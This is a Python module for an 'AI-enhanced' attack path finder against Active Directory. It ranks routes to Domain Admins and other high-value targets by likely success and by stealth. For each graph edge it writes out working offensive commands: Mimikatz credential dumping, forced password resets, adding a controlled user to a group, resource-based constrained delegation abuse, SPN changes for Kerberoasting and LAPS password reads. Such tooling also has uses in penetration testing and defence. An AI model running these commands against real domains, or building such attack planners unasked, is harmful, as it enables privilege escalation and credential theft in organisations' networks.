import networkx as nx
import numpy as np
from typing import List, Dict, Any, Tuple, Set, Optional
from .graph import ADGraph

class AttackPathFinder:
    """
    AI-enhanced attack path finder for Active Directory environments.
    """
    
    def __init__(self, graph: ADGraph):
        self.graph = graph
        self.nx_graph = graph.graph
        self.high_value_targets = set(graph.get_all_high_value_targets())
        
        # Attack technique scores (likelihood of success, stealth, etc.)
        self.technique_scores = {
            'MemberOf': {'success': 0.9, 'stealth': 0.8},
            'AdminTo': {'success': 0.9, 'stealth': 0.7},
            'HasSession': {'success': 0.8, 'stealth': 0.6},
            'GenericAll': {'success': 0.9, 'stealth': 0.5},
            'GenericWrite': {'success': 0.8, 'stealth': 0.5},
            'WriteOwner': {'success': 0.8, 'stealth': 0.4},
            'WriteDacl': {'success': 0.8, 'stealth': 0.4},
            'AllExtendedRights': {'success': 0.8, 'stealth': 0.5},
            'AddMember': {'success': 0.9, 'stealth': 0.6},
            'ForceChangePassword': {'success': 0.9, 'stealth': 0.4},
            'ReadLAPSPassword': {'success': 0.9, 'stealth': 0.5},
            'ReadGMSAPassword': {'success': 0.9, 'stealth': 0.5},
            'GPLink': {'success': 0.7, 'stealth': 0.5},
            # Default for any other relationship
            'Default': {'success': 0.6, 'stealth': 0.5}
        }
    
    def find_paths_to_domain_admin(self, source_id: str, max_paths: int = 5) -> List[Dict[str, Any]]:
        """
        Find paths from source to Domain Admins group or equivalent.
        
        Args:
            source_id: The starting node ID
            max_paths: Maximum number of paths to return
            
        Returns:
            List of path dictionaries with details
        """
        domain_admin_groups = self._find_domain_admin_groups()
        
        if not domain_admin_groups:
            print("No Domain Admins group found")
            return []
            
        all_paths = []
        for group_id in domain_admin_groups:
            paths = self.graph.find_shortest_paths(source_id, group_id, max_paths)
            
            for path in paths:
                scored_path = self.score_path(path)
                all_paths.append(scored_path)
                
        # Sort by total score (higher is better)
        all_paths.sort(key=lambda p: p['total_score'], reverse=True)
        return all_paths[:max_paths]
    
    def find_paths_to_high_value_targets(self, source_id: str, max_paths: int = 5) -> List[Dict[str, Any]]:
        """
        Find paths from source to any high-value target.
        
        Args:
            source_id: The starting node ID
            max_paths: Maximum number of paths to return
            
        Returns:
            List of path dictionaries with details
        """
        all_paths = []
        
        for target_id in self.high_value_targets:
            paths = self.graph.find_shortest_paths(source_id, target_id, max_paths=2)
            
            for path in paths:
                scored_path = self.score_path(path)
                all_paths.append(scored_path)
                
        # Sort by total score (higher is better)
        all_paths.sort(key=lambda p: p['total_score'], reverse=True)
        return all_paths[:max_paths]
    
    def _find_domain_admin_groups(self) -> List[str]:
        """Find Domain Admins groups in the graph."""
        domain_admin_groups = []
        
        for node_id, attrs in self.nx_graph.nodes(data=True):
            if attrs.get('type') == 'Group':
                name = attrs.get('name', '').upper()
                if 'DOMAIN ADMINS' in name:
                    domain_admin_groups.append(node_id)
                    
        return domain_admin_groups
    
    def score_path(self, path: List[str]) -> Dict[str, Any]:
        """
        Score an attack path based on multiple factors.
        
        Args:
            path: A list of node IDs representing the path
            
        Returns:
            Dictionary with path details and scores
        """
        if len(path) < 2:
            return {
                'path': path,
                'steps': [],
                'length': 0,
                'success_score': 0,
                'stealth_score': 0,
                'total_score': 0
            }
            
        steps = []
        success_probs = []
        stealth_scores = []
        
        for i in range(len(path) - 1):
            source_id = path[i]
            target_id = path[i+1]
            
            source_name = self.nx_graph.nodes[source_id].get('name', source_id)
            target_name = self.nx_graph.nodes[target_id].get('name', target_id)
            
            edge_data = self.nx_graph.get_edge_data(source_id, target_id)
            relationship = edge_data.get('relationship', 'Unknown')
            
            # Get technique scores
            technique = self.technique_scores.get(relationship, self.technique_scores['Default'])
            success_prob = technique['success']
            stealth_score = technique['stealth']
            
            # Adjust scores based on node types
            source_type = self.nx_graph.nodes[source_id].get('type', '')
            target_type = self.nx_graph.nodes[target_id].get('type', '')
            
            # For example, attacking domain controllers is less stealthy
            if target_type == 'Computer' and 'DC' in target_name.upper():
                stealth_score *= 0.7
                
            success_probs.append(success_prob)
            stealth_scores.append(stealth_score)
            
            step = {
                'source': source_name,
                'source_id': source_id,
                'target': target_name,
                'target_id': target_id,
                'relationship': relationship,
                'success_prob': success_prob,
                'stealth_score': stealth_score,
                'techniques': self._get_attack_techniques(source_id, target_id, relationship)
            }
            
            steps.append(step)
            
        # Calculate overall path scores
        # Success probability is the product of all step probabilities
        overall_success = np.prod(success_probs)
        
        # Stealth score is the average of all step stealth scores
        overall_stealth = np.mean(stealth_scores)
        
        # Total score combines success, stealth, and path length
        length_factor = 1.0 / len(path)  # Shorter paths are better
        total_score = (overall_success * 0.4 + overall_stealth * 0.3 + length_factor * 0.3) * 100
        
        return {
            'path': path,
            'steps': steps,
            'length': len(path) - 1,
            'success_score': overall_success * 100,
            'stealth_score': overall_stealth * 100,
            'total_score': total_score
        }
    
    def _get_attack_techniques(self, source_id: str, target_id: str, relationship: str) -> List[Dict[str, str]]:
        """
        Generate attack technique recommendations for a specific edge.
        
        Args:
            source_id: The source node ID
            target_id: The target node ID
            relationship: The edge relationship type
            
        Returns:
            List of attack technique dictionaries
        """
        techniques = []
        source_type = self.nx_graph.nodes[source_id].get('type', '')
        target_type = self.nx_graph.nodes[target_id].get('type', '')
        
        if relationship == 'MemberOf':
            techniques.append({
                'name': 'Group Membership',
                'description': 'Use existing group membership privileges',
                'command': f'# Leverage existing membership in {self.nx_graph.nodes[target_id].get("name", "")}'
            })
            
        elif relationship == 'AdminTo':
            techniques.append({
                'name': 'Local Admin Access',
                'description': 'Use administrative access to the target computer',
                'command': f'Enter-PSSession -ComputerName {self.nx_graph.nodes[target_id].get("name", "").split("@")[0]}'
            })
            
            techniques.append({
                'name': 'Credential Dumping',
                'description': 'Dump credentials from the target computer',
                'command': 'Invoke-Mimikatz -Command "sekurlsa::logonpasswords"'
            })
            
        elif relationship == 'GenericAll':
            if target_type == 'User':
                techniques.append({
                    'name': 'Force Password Reset',
                    'description': 'Reset the user\'s password',
                    'command': f'Set-DomainUserPassword -Identity {self.nx_graph.nodes[target_id].get("name", "").split("@")[0]} -Password (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)'
                })
                
            elif target_type == 'Group':
                techniques.append({
                    'name': 'Add to Group',
                    'description': 'Add a user to the target group',
                    'command': f'Add-DomainGroupMember -Identity "{self.nx_graph.nodes[target_id].get("name", "").split("@")[0]}" -Members "YourControlledUser"'
                })
                
            elif target_type == 'Computer':
                techniques.append({
                    'name': 'Resource-Based Constrained Delegation',
                    'description': 'Configure RBCD to gain access',
                    'command': f'Set-DomainObject -Identity "{self.nx_graph.nodes[target_id].get("name", "").split("@")[0]}" -Set @{{msDS-AllowedToActOnBehalfOfOtherIdentity=<SID_BLOB>}}'
                })
                
        elif relationship == 'GenericWrite':
            if target_type == 'User':
                techniques.append({
                    'name': 'SPN Modification',
                    'description': 'Set a Service Principal Name to enable Kerberoasting',
                    'command': f'Set-DomainObject -Identity "{self.nx_graph.nodes[target_id].get("name", "").split("@")[0]}" -Set @{{serviceprincipalname="fake/service"}}'
                })
                
            elif target_type == 'Computer':
                techniques.append({
                    'name': 'Computer Account Attribute Modification',
                    'description': 'Modify computer account attributes',
                    'command': f'Set-DomainObject -Identity "{self.nx_graph.nodes[target_id].get("name", "").split("@")[0]}" -Set @{{description="Updated description"}}'
                })
                
        elif relationship == 'HasSession':
            techniques.append({
                'name': 'Session Hijacking',
                'description': 'Target the existing user session',
                'command': f'Invoke-Mimikatz -Command "sekurlsa::logonpasswords" # Look for {self.nx_graph.nodes[source_id].get("name", "").split("@")[0]}'
            })
            
        elif relationship == 'ReadLAPSPassword':
            techniques.append({
                'name': 'LAPS Password Reading',
                'description': 'Read the LAPS password for the target computer',
                'command': f'Get-DomainObject -Identity "{self.nx_graph.nodes[target_id].get("name", "").split("@")[0]}" -Properties ms-mcs-AdmPwd'
            })
            
        # Add a default technique if none matched
        if not techniques:
            techniques.append({
                'name': f'Exploit {relationship}',
                'description': f'Use the {relationship} relationship',
                'command': f'# Use appropriate tools to leverage {relationship} relationship'
            })
            
        return techniques
